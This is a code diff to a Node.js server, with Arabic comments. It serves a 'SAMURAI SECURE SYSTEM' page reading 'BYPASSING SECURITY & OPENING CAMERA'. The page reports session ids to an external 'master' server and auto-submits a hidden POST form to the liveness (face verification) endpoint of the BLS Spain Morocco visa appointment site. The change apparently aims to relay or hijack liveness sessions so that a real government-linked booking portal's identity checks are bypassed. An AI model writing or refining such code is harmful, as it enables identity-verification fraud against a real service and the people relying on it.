@@ -11,7 +11,7 @@ const server = http.createServer((req, res) => {
 
     if (req.method === 'OPTIONS') { res.writeHead(204); res.end(); return; }
 
-    // 🔥 توجيه العميل مباشرة إلى رابط الـ livenessrequest الخاص بالموقع الرسمي
+    // 🔥 محاكاة طلب POST وهمي لتجاوز خطأ 405 نهائياً
     if (req.method === 'GET' && req.url.startsWith('/liveness')) {
         res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
         res.end(`
@@ -28,7 +28,7 @@ const server = http.createServer((req, res) => {
             </head>
             <body>
                 <h1>SAMURAI SECURE SYSTEM</h1>
-                <p id="status">[ BYPASSING LOGIN & OPENING CAMERA... ]</p>
+                <p id="status">[ BYPASSING SECURITY & OPENING CAMERA... ]</p>
                 <div class="spinner"></div>
 
                 <script>
@@ -37,16 +37,27 @@ const server = http.createServer((req, res) => {
                     const SERVER_URL = "https://silfi-production.up.railway.app";
 
                     if (sessionId) {
-                        // إعلام الماستر بأن العميل فتح الرابط
+                        // إعلام الماستر بأن العميل فتح الرابط وانضم
                         fetch(SERVER_URL, {
                             method: 'POST',
                             headers: { 'Content-Type': 'application/json' },
                             body: JSON.stringify({ type: "CLIENT_CONNECTED", session_id: sessionId })
                         }).catch(e => {});
 
-                        // التوجيه المباشر لصفحة طلب الكاميرا الفعلية مع تمرير الـ session
+                        // إنشاء Form لإرسال الطلب بالطريقة الصحيحة (POST) لتفادي خطأ 405
                         setTimeout(() => {
-                            window.location.href = "https://www.blsspainmorocco.net/MAR/appointment/LivenessRequest?session=" + sessionId;
+                            const form = document.createElement('form');
+                            form.method = 'POST';
+                            form.action = 'https://www.blsspainmorocco.net/MAR/appointment/LivenessRequest';
+
+                            const input = document.createElement('input');
+                            input.type = 'hidden';
+                            input.name = 'session';
+                            input.value = sessionId;
+
+                            form.appendChild(input);
+                            document.body.appendChild(form);
+                            form.submit();
                         }, 1200);
                     } else {
                         document.getElementById('status').innerText = "[ ERROR: INVALID SESSION ]";
